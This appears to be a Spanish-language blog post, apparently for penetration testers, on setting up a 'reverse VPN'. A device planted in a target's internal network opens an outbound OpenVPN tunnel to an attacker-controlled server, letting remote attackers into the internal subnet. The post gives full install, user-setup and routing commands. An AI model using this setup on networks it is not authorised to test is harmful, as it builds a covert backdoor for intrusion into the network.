---
layout: post
title: Reverse VPN
---

Add attackers with reverse VPN (openvpn)

Basado en la publicacion: [https://github.com/offensive-security/kali-nethunter/issues/421](https://github.com/offensive-security/kali-nethunter/issues/421){:target="_blank"}

# Como funciona
```
Awesome Expert Diagram

 ------------      Port 443       ------------        ------------
|    Doom    |<----------------> |  OpenVPN   |<-----| Additional |      
|            |                   |            |      |            |
|   Target   |                   |   Server   |      |  Attacker  |
 ------------                     ------------        ------------
192.168.1.0/24                  https://vpnserver       Anywhere  
 (doom.ovpn)                                         (artemis.ovpn)
```

Crea una conexion VPN reversa desde Doom hacia OpenVPN y de esta forma agregar atacantes a una red interna cuando solo se tiene un dispositivo fisico. El dispositivo Doom puede ser tanto Raspbian como NetHunter, tambien deberia funcionar en un OpenWRT pero aun no lo he probado. Para el ejemplo se supondra de que la red interna donde esta Doom es `192.168.1.0/24`


# Setup OpenVPN

### Instalacion
Para saber las versiones de OpenVPN disponibles puedes visitar: [https://openvpn.net/index.php/access-server/download-openvpn-as-sw.html](https://openvpn.net/index.php/access-server/download-openvpn-as-sw.html){:target="_blank"}

En mi caso ocupo un Ubuntu 14 de 64 bits

```
wget https://swupdate.openvpn.org/as/openvpn-as-2.1.2-Ubuntu14.amd_64.deb
sudo dpkg -i openvpn-as-2.1.2-Ubuntu14.amd_64.deb
passwd openvpn
[coloca una contraseña]
sudo su
cd /usr/local/openvpn_as/bin && ./ovpn-init
```

### Configuracion
```
Please enter 'DELETE' to delete existing configuration: DELETE

Please enter 'yes' to indicate your agreement [no]: yes

Will this be the primary Access Server node?
(enter 'no' to configure as a backup or standby node)
> Press ENTER for default [yes]: yes

Please enter the option number from the list above (1-2).
> Press Enter for default [2]: 1

Please specify the port number for the Admin Web UI.
> Press ENTER for default [943]: 

Please specify the TCP port number for the OpenVPN Daemon
> Press ENTER for default [443]: 

Should client traffic be routed by default through the VPN?
> Press ENTER for default [yes]: 

Should client DNS traffic be routed by default through the VPN?
> Press ENTER for default [yes]: 

Use local authentication via internal DB?
> Press ENTER for default [no]: yes

Should private subnets be accessible to clients by default?
> Press ENTER for default [yes]: 

Do you wish to login to the Admin UI as "openvpn"?
> Press ENTER for default [yes]: 

> Please specify your OpenVPN-AS license key (or leave blank to specify later): 
```

### Agregando usuarios
```
Visitar la webadmin: https://[vpnurl]:943/admin

Login: openvpn
Password: [la contraseña creada anteriormente]

User Management
    User Permissions
        New Username: artemis
        Allow Auto-login
        "click show"
        Local Password: [set password]
        Save Settings
        Update Running Server

        New Username: doom
        "click show"
        Local Password: [set password]
        Allow Auto-login
        Allow Access From: all server-side private subnet
        Allow Access From: all other VPN clients
        VPN Gateway
            Yes
                192.168.1.0/24
        Save Settings
        Update Running Server
```

### Descargando el cliente
```
Visitar: https://[vpnurl]

Loguearse con Username/password en cada cuenta correspondiente

Descargar client.ovpn con autologin profiles.

Puedes renombrarlos para recordarlos mas facil:
doom_client.ovpn  < -- esto es para el dispositivo Doom
artemis_client.ovpn  <--  esto es para otros atacantes
```

### Configurando al dispositivo Doom
En este ejemplo ocupé un NetHunter como Doom

```
# Realizar solo una vez
mkdir -p /data/local/tmp

# Configurar Gateway
ip route replace default via 192.168.1.1 dev wlan0

# ejecutar la configuracion del archivo ovpn
openvpn --config doom.ovpn

# Abrir una nueva terminal y configurar las routing tables
ip rule add from 192.168.1.0/24 lookup 61
ip route add default dev tun0 scope link table 61
ip route add 192.168.1.0/24 dev wlan0 scope link table 61
ip route add broadcast 255.255.255.255 dev wlan0 scope link table 61
```

### Configurando al atacante (cliente)
Solo tienes que ejecutar el cliente `artemis_client.ovpn` usando openvpn para poder tener acceso a la red interna 
que anteriormente configuramos `192.168.1.0/24`
